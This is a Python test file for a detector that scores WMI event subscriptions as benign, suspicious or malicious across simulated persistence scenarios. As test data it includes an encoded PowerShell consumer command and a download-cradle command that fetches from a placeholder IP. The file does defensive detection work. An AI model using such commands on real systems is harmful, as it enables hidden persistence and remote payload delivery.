"""End-to-end detector tests on the generated scenario set."""

from __future__ import annotations

from pathlib import Path

import pytest

from detector.model import Subscription
from detector.parser import load_scenario
from detector.scoring import analyze_bundle, assess_subscription, load_allowlist
from simulator.generate_dataset import generate
from simulator.scenario_catalog import SID_STUDENT, build_scenarios


@pytest.fixture(scope="module")
def dataset(tmp_path_factory: pytest.TempPathFactory) -> Path:
    out = tmp_path_factory.mktemp("d12") / "scenarios"
    generate(out)
    return out


@pytest.fixture(scope="module")
def bundles(dataset: Path) -> dict[str, dict]:
    return {path.name: load_scenario(path) for path in sorted(dataset.iterdir()) if path.is_dir()}


def test_dataset_composition(dataset: Path) -> None:
    truths = [load_scenario(path) for path in dataset.iterdir() if path.is_dir()]
    assert sum(1 for item in truths if item["label"] == 0) >= 3
    assert sum(1 for item in truths if item["label"] == 1) >= 3
    variants = {item["ground_truth"]["variant"] for item in truths if item["label"] == 1}
    assert len(variants) >= 3


def test_benign_scenarios_are_not_malicious(bundles: dict[str, dict]) -> None:
    allowlist = load_allowlist()
    for name, bundle in bundles.items():
        if bundle["label"] != 0:
            continue
        result = analyze_bundle(bundle, allowlist=allowlist)
        assert result["verdict"] != "malicious", (name, result["score"])
        assert result["score"] < 60


def test_builtin_scm_is_allowlisted(bundles: dict[str, dict]) -> None:
    allowlist = load_allowlist()
    result = analyze_bundle(bundles["B1_builtin_scm"], allowlist=allowlist)
    assert result["subscriptions"][0]["allowlisted"] is True
    assert result["score"] == 0


def test_labelled_malicious_scenarios_are_flagged(bundles: dict[str, dict]) -> None:
    allowlist = load_allowlist()
    triage = {"suspicious": 40, "malicious": 50}
    for name, bundle in bundles.items():
        if bundle["label"] != 1:
            continue
        result = analyze_bundle(bundle, allowlist=allowlist)
        assert result["verdict"] in {"malicious", "suspicious"}, (name, result["score"])
        rules = {
            evidence["rule"]
            for sub in result["subscriptions"]
            for evidence in sub["evidence"]
            if evidence["weight"] > 0
        }
        assert rules, name
        if name != "M6_stealth_low_noise":
            assert result["verdict"] == "malicious", (name, result["score"])

    # The low-noise variant is caught by the triage operating point.
    m6 = analyze_bundle(bundles["M6_stealth_low_noise"], allowlist=allowlist, thresholds=triage)
    assert m6["verdict"] == "malicious"


def test_low_noise_variant_needs_triage_tier(bundles: dict[str, dict]) -> None:
    allowlist = load_allowlist()
    result = analyze_bundle(bundles["M6_stealth_low_noise"], allowlist=allowlist)
    assert result["verdict"] == "suspicious"
    assert 40 <= result["score"] < 60

    strict = analyze_bundle(bundles["M6_stealth_low_noise"], allowlist=allowlist)
    assert strict["predicted"] == 0

    triage = analyze_bundle(
        bundles["M6_stealth_low_noise"],
        allowlist=allowlist,
        thresholds={"suspicious": 40, "malicious": 50},
    )
    assert triage["verdict"] == "malicious"


def test_events_only_detection(dataset: Path) -> None:
    allowlist = load_allowlist()
    for scenario_id in ("B1_builtin_scm", "M2_activescript_masquerade", "M5_network_activescript"):
        bundle = load_scenario(dataset / scenario_id, source="events")
        assert bundle["subscriptions"], scenario_id
        result = analyze_bundle(bundle, allowlist=allowlist)
        expected = "benign" if scenario_id.startswith("B") else "malicious"
        assert result["verdict"] == expected


def test_event_log_reconstruction_matches_repository(dataset: Path) -> None:
    """5861 contains the full definition, so both sources must agree."""
    allowlist = load_allowlist()
    for directory in sorted(path for path in dataset.iterdir() if path.is_dir()):
        from_repo = analyze_bundle(load_scenario(directory), allowlist=allowlist)
        from_log = analyze_bundle(
            load_scenario(directory, source="events"), allowlist=allowlist
        )
        assert from_repo["score"] == from_log["score"], directory.name


def test_encoded_action_adds_evidence() -> None:
    sub = Subscription(
        filter_name="F",
        filter_namespace="root\\subscription",
        event_namespace="root\\cimv2",
        query="SELECT * FROM __TimerEvent",
        query_language="WQL",
        consumer_name="C",
        consumer_class="CommandLineEventConsumer",
        consumer_properties={
            "CommandLineTemplate": "powershell.exe -EncodedCommand AAAA",
        },
        creator_sid=SID_STUDENT,
        creator_user="LAB\\user",
    )
    assessment = assess_subscription(sub)
    rule_ids = {item.rule_id for item in assessment.evidence}
    assert {"R01", "R02", "R04"}.issubset(rule_ids)


def test_allowlist_does_not_hide_strong_evidence() -> None:
    scenario = next(s for s in build_scenarios() if s["scenario_id"] == "B1_builtin_scm")
    sub = subscriptions_from_repository_helper(scenario)
    allowlist = load_allowlist()
    clean = assess_subscription(sub, allowlist=allowlist)
    assert clean.allowlisted is True

    # Same names/query but a download cradle in the consumer must not be
    # silently allow-listed.
    sub.consumer_properties["CommandLineTemplate"] = (
        'powershell.exe -EncodedCommand AAAA -Command "Invoke-WebRequest http://198.51.100.10/a"'
    )
    dirty = assess_subscription(sub, allowlist=allowlist)
    assert dirty.allowlisted is False
    assert dirty.verdict == "malicious"


def subscriptions_from_repository_helper(scenario: dict) -> Subscription:
    from detector.parser import subscriptions_from_repository

    return subscriptions_from_repository(scenario["repository"])[0]
